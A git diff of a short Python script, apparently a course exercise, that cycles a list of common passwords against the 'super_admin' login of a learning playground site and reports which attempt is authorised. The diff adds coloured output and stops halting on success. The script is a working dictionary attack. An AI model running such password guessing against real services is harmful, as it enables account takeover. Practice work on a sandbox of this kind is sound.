@@ -1,7 +1,10 @@
 import requests
+import colorama
+from colorama import Fore, Back, Style
+colorama.init()
 
 login = "super_admin"
-list_top_passwords = [
+passwords = [
     '123456',
     '123456789',
     'qwerty',
@@ -28,12 +31,6 @@ list_top_passwords = [
     'password1',
     '123qwe']
 
-# удаляем дубли
-passwords = []
-for ltp in list_top_passwords:
-        passwords.append(ltp)
-
-print(f"searching among {len(passwords)} passwords...")
 for password in passwords:
     payload = {
        "login": login,
@@ -44,7 +41,7 @@ for password in passwords:
     cookies = {'auth_cookie': cookie_value}
 
     response2 = requests.get("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies=cookies)
-    if response2.text != "You are NOT authorized":
-        print(f"login:{login}, password: {password}, response: {response2.text}")
-        break
-print("finish!")
+    if response2.text == "You are NOT authorized":
+        print(Fore.RED +f"Login:{login}, Password: {password}, Response: {response2.text}")
+    else: print(Fore.GREEN +f"Login:{login}, Password: {password}, Response: {response2.text}")
+
